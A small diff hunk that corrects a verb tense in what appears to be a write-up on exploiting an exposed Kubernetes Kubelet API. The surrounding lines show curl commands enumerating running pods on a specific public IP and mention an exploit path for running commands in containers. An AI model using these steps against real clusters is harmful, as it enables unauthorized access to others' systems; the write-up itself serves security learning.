@@ -50,7 +50,7 @@ $ curl -k https://47.75.146.42:10250/stats/
 
 I immediately search for `Exploit Kubelet` and boom: https://github.com/kayrus/kubelet-exploit
 where we can use `/run/%namespace%/%pod_name%/%container_name%` to exploit it but first we must have
-`namespace`,`pod_name`,`container_name`. I achieve this by
+`namespace`,`pod_name`,`container_name`. I achieved this by
 ```
 $curl -sk https://47.75.146.42:10250/runningpods/ | python -mjson.tool
 {
